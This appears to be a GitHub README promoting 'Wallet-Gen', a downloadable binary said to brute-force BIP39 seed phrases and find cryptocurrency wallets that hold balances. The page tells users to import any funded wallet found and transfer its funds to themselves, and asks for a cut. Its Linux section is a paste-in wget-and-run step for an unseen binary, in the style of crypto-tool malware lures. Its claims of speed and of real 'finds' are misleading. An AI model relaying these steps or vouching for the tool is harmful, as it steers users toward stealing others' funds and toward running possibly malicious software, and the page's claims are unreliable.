# Seed Phrase / Private Key Generator (Wallet-Gen) – Crypto Wallet Generator, Checker, Recover & Balance Finder for Lost Bitcoin (BTC), Ethereum (ETH), and other EVM Chains


[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20MacOS%20%7C%20Linux-blue)](../../releases/tag/wallet-gen)
![build](https://img.shields.io/badge/build-passing-brightgreen)

| |  |
|--------|------|
| <img src="/assets/wallet-gen-windows.jpg" width="500"> | <img src="/assets/wallet-gen_macos1.webp" width="500"> |

## How It Works

Wallet-Gen generates wallets using **BIP39**, **BIP44**, and **Bech32** for Bitcoin, and **Keccak256** hashing for EVM-based chains like Ethereum.

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 

##  Why Wallet-Gen?

1. Unlike Python-based brute force tools, **Wallet-Gen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **100x faster** performance. Whether you’re exploring lost wallets, verifying private key space, or recovering your own wallet, Wallet-Gen gives you the power to do it efficiently and securely.
2. Wallets like Bitcoin Core, Electrum, Metamask, Trust Wallet, etc., use specific implementations of BIP39/BIP44 and others. Wallet-Gen GPU replicates these exact algorithms — from both old and new versions — capturing real-world entropy models.
3. It uses GPU acceleration to generate and scan massive numbers of seed phrases and derive multiple address paths per seed.
4. Wallet-Gen GPU focuses on realistic derivation schemes, outdated algorithms, and edge-case entropy flaws — things most tools ignore.


## Features

- **Generation of cryptocurrency wallets**
- **Search for wallets with balance**
- **Using a database to speed up searches**
- **High speed of operation**
- **Recovery your Bitcoin wallet**
- **Brain wallet generator**

# Download Wallet-Gen

## Windows 
- Download [Wallet-Gen-Windows-x64-setup](../../releases/tag/wallet-gen)

## MacOS

- Download [Wallet-Gen.dmg](../../releases/tag/wallet-gen)

## Linux (x86-64bit)
```bash
wget https://github.com/pengakuza/tony-cdev/releases/download/wallet-gen/wallet-gen-linux-x64.tar.gz
tar -xzf  wallet-gen-linux-x64.tar.gz
cd wallet-gen
./wallet-gen
```


## Demo

<p align="center">
  <b>Windows</b><br>
  <img width="900" alt="Wallet-Gen Windows demo" src="/assets/wallet-gen-demo.gif" />
</p>

<p align="center">
  <b>macOS</b><br>
  <img width="900" alt="Wallet-Gen macOS demo" src="/assets/wallet-gen_macos2.webp" />
</p>

<p align="center">
  <b>Linux</b><br>
  <img width="900" alt="Wallet-Gen Linux demo" src="/assets/wallet-gen-linux.png" />
</p>


## Wallet-Gen Finds


<img width="1070" height="533" alt="find1" src="https://github.com/user-attachments/assets/57ebb4ab-ac2b-4415-902b-d9f4bf38fb5f" />

<img width="1200" height="766" alt="find3" src="https://github.com/user-attachments/assets/05000872-4b9e-4f6b-9b55-fbf4f4e9ccbd" />
<img width="1200" height="529" alt="find2" src="https://github.com/user-attachments/assets/4d804215-aff4-4cb9-8342-b6247df81a3a" />

<img width="1200" height="646" alt="find6" src="https://github.com/user-attachments/assets/19c0507b-439c-4a2f-b56c-bd58a82baa9b" />

<img width="1200" height="501" alt="find7" src="https://github.com/user-attachments/assets/43035b67-e4d9-45f9-ace4-dc1a1a529a86" />

<table>
<tr>
<td>
<img src="https://github.com/user-attachments/assets/28b9fdf3-036b-4699-badb-1f382f3d2e9c" width="700">
</td>
<td>
<img src="https://github.com/user-attachments/assets/ad730fba-76b4-4186-aa35-971f1e2b47ab" width="260">
</td>
</tr>
</table>

<img width="1200" height="536" alt="find9" src="https://github.com/user-attachments/assets/f3f000c5-b4ab-4fd2-aa2e-12eb08164056" />

<img width="1200" height="841" alt="find12" src="https://github.com/user-attachments/assets/841f1ba0-bb10-4b10-b262-98bb7afbc8ab" />

<img width="1145" height="618" alt="find10" src="https://github.com/user-attachments/assets/2c9ae843-c5a9-486e-a3fd-4a3225cd5673" />



## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to search using brute-force method for two types of crypto wallets with an existing balance.

### For Bitcoin (BTC) wallets:

* Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
* Press key 6 to search Bitcoin wallets using the database. This method is faster because it compares generated wallets against a pre-built database of known addresses with balances.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

* Press key 5 or run start_search_evm.bat to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
* Press key 6 to search EVM wallets using the database. This method is faster since it compares generated wallets against the known database of addresses with balance.

### Speed Considerations:

* The speed of the search depends heavily on your hardware, especially the graphics card (GPU). To speed up the process and increase your chances of finding a wallet with a balance, you can run multiple instances of the program (1 to 4), depending on your system's performance

By using the database, you can significantly improve the efficiency of your search, as it eliminates the need to query the blockchain for every wallet generated

## The Program Found a Wallet — What’s Next?
When the program finds a wallet with a balance, it will:
* **Stop** immediately
* **Display** the wallet details in the console
* **Save** this data in the ``found_wallets.txt`` file

### How to Access the Funds?
1. Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
2. Once restored, you’ll be able to transfer the funds to your own wallet.
   
>  If the find is successful, be sure to share a small portion of the balance you find with me! Thank you!

## Recovery Your Bitcoin Wallet

Wallet-Gen allows you to recover your bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words using special characters.

### Process Description

#### Search for missing words:

If your seed phrase is missing some words or you are unsure, replace those words with an *. Wallet-Gen will search through all possible variations in the places of * to find the correct seed phrase and restore the associated wallet balance.

#### Entering a complete seed-phrase:

If you have a full 12-word seed, simply enter it in full with a space. Wallet-Gen will generate all address types (Legacy, SegWit, P2SH) and check their balances.

![recovery](/assets/recovery.webp)

### Important recommendations

* Seed-phrase must contain exactly 12 words.
* Use only the * symbol to search for missing words.
* Searching for missing words may take considerable time, especially if several words are missing.
* If the wallet with balance is successfully recovered, the program will automatically stop and save the found data.


## Building the Project

1. Open the project folder (`wallet-gen`) in Visual Studio Code or any other compatible C++ compiler.
2. Install the necessary dependencies and build the project via **MakeFile**.

3. Start building the project.

```cmd
> make 
```

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Can Wallet-Gen help me recover a lost Bitcoin wallet?
Yes. Wallet-Gen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is Wallet-Gen a seed phrase generator?
Yes. Wallet-Gen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. Wallet-Gen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.


## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)


